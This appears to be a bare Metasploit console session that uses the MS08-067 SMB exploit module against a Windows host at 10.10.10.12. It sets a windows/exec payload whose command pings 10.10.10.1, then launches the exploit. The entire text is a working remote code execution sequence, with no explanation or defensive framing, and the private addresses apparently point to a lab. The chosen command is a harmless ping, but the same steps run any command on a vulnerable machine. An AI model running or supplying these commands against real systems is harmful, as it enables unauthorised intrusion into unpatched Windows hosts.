use exploit/windows/smb/ms08_067_netapi
info
set PAYLOAD windows/exec
set RHOST 10.10.10.12
set CMD cmd /c ping 10.10.10.1 -n 1
show options
exploit
